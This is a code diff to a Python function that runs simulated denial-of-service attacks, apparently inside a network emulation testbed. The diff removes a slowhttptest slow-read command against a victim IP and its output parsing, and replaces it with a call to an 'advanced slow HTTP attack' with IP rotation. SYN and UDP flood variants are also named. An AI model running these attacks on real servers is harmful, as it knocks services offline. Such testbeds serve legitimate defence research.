@@ -63,88 +63,10 @@ def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", o
     attack_results = {}  # Dictionary to store results for summary
 
     if attack_variant == "slow_read":
-        # Slow read attack using slowhttptest
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Attack Phase: Adversarial Slow Read - Attacker: {attacker_host.name}, Target: {victim_ip}, Duration: {duration}s")
-        slowhttptest_cmd = f"slowhttptest -c 100 -H -i 10 -r 20 -l {duration} -u http://{victim_ip}:80/ -t SR"
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Executing slowhttptest command: {slowhttptest_cmd}")
-        
-        process = attacker_host.popen(slowhttptest_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        time.sleep(duration)
-        
-        try:
-            if process.poll() is None:
-                process.send_signal(signal.SIGINT)
-                attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Sent SIGINT to slowhttptest process {process.pid}")
-                time.sleep(1) 
-        except Exception as e:
-            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Error sending SIGINT to slowhttptest: {e}")
-        
-        if process.poll() is None:
-            attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process {process.pid} did not terminate gracefully, forcing termination.")
-            process.terminate()
-            time.sleep(1)
-        
-        stdout, stderr = process.communicate()
-        stdout_str = stdout.decode().strip()
-        stderr_str = stderr.decode().strip()
-
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest (Slow Read) from {attacker_host.name} to {victim_ip} finished.")
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- slowhttptest Summary ---")
-        
-        # Parse slowhttptest output
-        exit_status_match = re.search(r"Exit Status: (\\d+)", stdout_str)
-        pending_match = re.search(r"pending connections:\\s*(\\d+)", stdout_str)
-        connected_match = re.search(r"connected connections:\\s*(\\d+)", stdout_str)
-        closed_match = re.search(r"closed connections:\\s*(\\d+)", stdout_str)
-        error_match = re.search(r"error connections:\\s*(\\d+)", stdout_str)
-        
-        if exit_status_match:
-            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Exit Status: {exit_status_match.group(1)}")
-        if pending_match:
-            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Pending Connections: {pending_match.group(1)}")
-        if connected_match:
-            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Connected Connections: {connected_match.group(1)}")
-        if closed_match:
-            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Closed Connections: {closed_match.group(1)}")
-        if error_match:
-            attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Error Connections: {error_match.group(1)}")
-
-        # Calculate and log total connections attempted and successful connections
-        pending = int(pending_match.group(1)) if pending_match else 0
-        connected = int(connected_match.group(1)) if connected_match else 0
-        closed = int(closed_match.group(1)) if closed_match else 0
-        errors = int(error_match.group(1)) if error_match else 0
-        
-        total_connections_attempted = pending + connected + closed + errors
-        successful_connections = connected
-        
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total Connections Attempted: {total_connections_attempted}")
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Successful Connections: {successful_connections}")
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stdout: {stdout_str}")
-
-        if stderr_str:
-            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest stderr: {stderr_str}")
-        
-        exit_code = process.returncode
-        if exit_code != 0:
-            attack_logger.error(f"[{attack_variant}] [Run ID: {run_id}] slowhttptest process exited with non-zero code: {exit_code}")
-        
-        attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------------")
-        attack_results[attack_variant] = {
-            "status": "completed",
-            "exit_code": exit_code,
-            "stdout_summary": {
-                "exit_status": exit_status_match.group(1) if exit_status_match else "N/A",
-                "pending": pending_match.group(1) if pending_match else "N/A",
-                "connected": connected_match.group(1) if connected_match else "N/A",
-                "closed": closed_match.group(1) if closed_match else "N/A",
-                "errors": error_match.group(1) if error_match else "N/A",
-                "total_attempted": total_connections_attempted,
-                "successful": successful_connections,
-            },
-            "stderr": stderr_str
-        }
-        return process
+        # Advanced slow HTTP attack with IP rotation and burst patterns
+        results = coordinator.advanced.advanced_slow_http_attack(victim_ip, duration=duration, run_id=run_id, attack_variant=attack_variant)
+        attack_results[attack_variant] = results
+        return None  # No process to return for advanced implementation
         
     elif attack_variant == "ad_syn":
         # Advanced TCP SYN attack
@@ -161,8 +83,8 @@ def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", o
         attack_results[attack_variant] = {"status": "unknown_variant", "message": "No specific attack executed for this variant."}
         return None
     
-    # Final summary for ad_syn and ad_udp
-    if attack_variant in ["ad_syn", "ad_udp"] and attack_results.get(attack_variant):
+    # Final summary for ad_syn, ad_udp, and slow_read
+    if attack_variant in ["ad_syn", "ad_udp", "slow_read"] and attack_results.get(attack_variant):
         summary = attack_results[attack_variant]
         attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --- Attack Summary ---")
         attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] Total {summary.get('type', 'packets/requests')} sent: {summary.get('total_sent', 0)}")
@@ -171,4 +93,4 @@ def run_attack(attacker_host, victim_ip, duration, attack_variant="slow_read", o
             attack_logger.warning(f"[{attack_variant}] [Run ID: {run_id}] Warning: {summary['warning_message']}")
         attack_logger.info(f"[{attack_variant}] [Run ID: {run_id}] --------------------")
     
-    return None  # For ad_syn and ad_udp, no direct process to return
+    return None  # For ad_syn, ad_udp, and slow_read, no direct process to return
